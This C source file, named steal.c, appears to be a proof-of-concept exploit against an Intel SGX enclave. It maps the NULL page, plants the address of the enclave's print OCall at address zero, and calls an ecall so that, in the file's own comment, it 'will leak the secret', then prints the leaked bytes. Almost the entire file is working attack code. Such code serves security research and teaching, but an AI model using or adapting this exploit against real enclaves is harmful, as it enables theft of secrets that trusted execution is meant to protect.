// file: steal.c
#include <sys/mman.h>
#include <stdio.h>
#include <fcntl.h>
#include <string.h>
#include <errno.h>

#include "sgx_urts.h"
#include "App.h"
#include "Enclave_u.h"

#define ENCLAVE_PATH "enclave.signed.so"

sgx_status_t enclave_init();

sgx_enclave_id_t enclave_id;

#define _T(x) x

int main() {
    // Initialize the enclave
    sgx_status_t ret = enclave_init();

    // Make NULL pointer deference valid
    void* zeromap = mmap(0, 4096, PROT_READ | PROT_WRITE, MAP_PRIVATE | MAP_ANONYMOUS
| MAP_FIXED, -1, 0);
    if(zeromap == MAP_FAILED){
      printf("mmap fail\n");
      perror("Error ");
      return errno;
    }
    void * func;

    enclave_get_address_of_ocall_print(enclave_id, &func);
    memcpy(0, &func, sizeof(func));
    
    // Store at NULL the address of the print OCall, which is known at enclave initialization

    // Ecall will leak the secret!!!
    ecall_process_secret(enclave_id);

    char *cur = (char *)zeromap;
    do{
    fprintf(stdout, "%c", *cur);
    }while(*(++cur) != 0);

    return 0;
}

sgx_status_t enclave_init() {
  sgx_status_t ret = SGX_SUCCESS;
  sgx_launch_token_t launch_token;
  int launch_token_update = 0;
  sgx_status_t status = SGX_SUCCESS;

  ret = sgx_create_enclave(_T(ENCLAVE_PATH), SGX_DEBUG_FLAG, &launch_token,
       &launch_token_update, &enclave_id, NULL);

  if (SGX_SUCCESS != ret) {
    fprintf(stdout, "Create enclave failed [%s]. %u\n", __FUNCTION__, ret);
  }
  return ret;

}
/* OCall functions */
void ocall_print_string(const char *str)
{
    /* Proxy/Bridge will check the length and null-terminate 
     * the input string to prevent buffer overflow. 
     */
    printf("%s", str);
}
